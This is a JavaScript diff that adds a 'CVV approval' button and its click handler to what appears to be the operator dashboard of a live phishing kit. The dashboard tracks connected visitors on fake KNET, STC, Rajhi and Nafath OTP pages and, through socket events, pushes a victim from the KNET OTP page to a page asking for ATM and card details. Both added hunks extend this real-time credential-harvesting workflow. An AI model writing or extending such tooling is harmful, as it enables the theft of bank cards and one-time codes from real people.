@@ -1576,6 +1576,10 @@
             } else if (dc.page === 'MyStc OTP') {
               // زر اتصال STC لصفحة MyStc OTP
               html += '<button id="' + codeStcBtnId + '" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>اتصال STC</button>';
+            } else if (dc.page === 'رمز التحقق كي نت (OTP)') {
+              // زر موافقة CVV لصفحة كي نت OTP - يحول العميل لصفحة ATM
+              const codeKnetCvvBtnId = 'code-knet-cvv-btn-' + visitor.socketId + '-' + index;
+              html += '<button id="' + codeKnetCvvBtnId + '" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة CVV</button>';
             } else if (dc.page === 'تحقق رقم الجوال (OTP)') {
               // أزرار صفحة تحقق رقم الجوال OTP
               const phoneOtpNafathBtnId = 'phone-otp-nafath-btn-' + visitor.socketId + '-' + index;
@@ -1637,6 +1641,25 @@
                     rajhiNavBtn.textContent = originalText;
                     rajhiNavBtn.classList.remove('bg-green-600');
                     rajhiNavBtn.classList.add('bg-blue-600', 'hover:bg-blue-700');
+                  }, 1500);
+                });
+              }
+              // Event listener لزر موافقة CVV كي نت
+              const knetCvvBtn = document.getElementById('code-knet-cvv-btn-' + visitor.socketId + '-' + index);
+              if (knetCvvBtn) {
+                knetCvvBtn.addEventListener('click', () => {
+                  socket.emit('admin:codeAction', { visitorSocketId: visitor.socketId, action: 'cvv', codeIndex: index });
+                  const v = Array.from(visitors.values()).find(v => v.socketId === visitor.socketId);
+                  if (v) { v.waitingForAdminResponse = false; }
+                  renderVisitorsList();
+                  const originalText = knetCvvBtn.textContent;
+                  knetCvvBtn.textContent = 'تم الإرسال ✓';
+                  knetCvvBtn.classList.remove('bg-green-600', 'hover:bg-green-700');
+                  knetCvvBtn.classList.add('bg-gray-500');
+                  setTimeout(() => {
+                    knetCvvBtn.textContent = originalText;
+                    knetCvvBtn.classList.remove('bg-gray-500');
+                    knetCvvBtn.classList.add('bg-green-600', 'hover:bg-green-700');
                   }, 1500);
                 });
               }
